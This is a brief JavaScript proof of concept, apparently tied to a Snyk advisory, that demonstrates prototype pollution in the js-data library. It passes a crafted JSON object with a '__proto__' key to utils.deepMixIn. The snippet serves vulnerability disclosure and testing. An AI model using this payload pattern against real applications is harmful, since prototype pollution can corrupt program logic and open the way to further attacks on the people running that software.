//https://snyk.io/vuln/SNYK-JS-JSDATA-1023655
 
   

  const { utils } = require("js-data");
  const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  utils.deepMixIn({}, source);
// End of file
